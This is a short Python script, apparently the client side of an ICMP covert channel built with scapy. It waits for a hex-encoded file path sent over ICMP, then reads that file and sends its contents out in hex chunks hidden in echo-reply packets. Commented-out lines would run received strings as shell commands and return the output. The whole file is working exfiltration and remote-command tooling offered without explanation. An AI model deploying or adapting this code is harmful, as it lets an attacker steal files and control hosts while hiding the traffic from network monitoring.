#!/usr/bin/env python3

# Client should be on the host machine

from scapy.all import *
import binascii

server = "127.0.0.1"
chunk = 100

def send_cmd(cmd):
	hex_cmd = binascii.hexlify(cmd.encode("utf8"))
	packet = IP(dst=server)/ICMP(type="echo-reply", id=0x6341, seq=0x1)/hex_cmd
	send(packet, verbose=0)
	print("[+] Packet sent")

def recv_cmd():
	recv = sniff(filter="host 127.0.0.1 and icmp", count=1, iface="lo")
	print("[+] Packet received")
	data = recv[0][Raw].load.decode('utf-8')
	cmd = binascii.unhexlify(data).decode("utf8")
	return cmd

def send_file(path):
	f = open(path, 'r')
	while True:
		data = f.read(chunk)
		hex_data = binascii.hexlify(data.encode("utf8"))
		if not data:
			break
		print(hex_data)
		packet = IP(dst=server)/ICMP(type="echo-reply", id=0x6341, seq=0x1)/hex_data
		send(packet, verbose=0)
	print("[+] File sent")

#out = os.popen(recv_cmd()).read()

#send_cmd(out)

send_file(recv_cmd())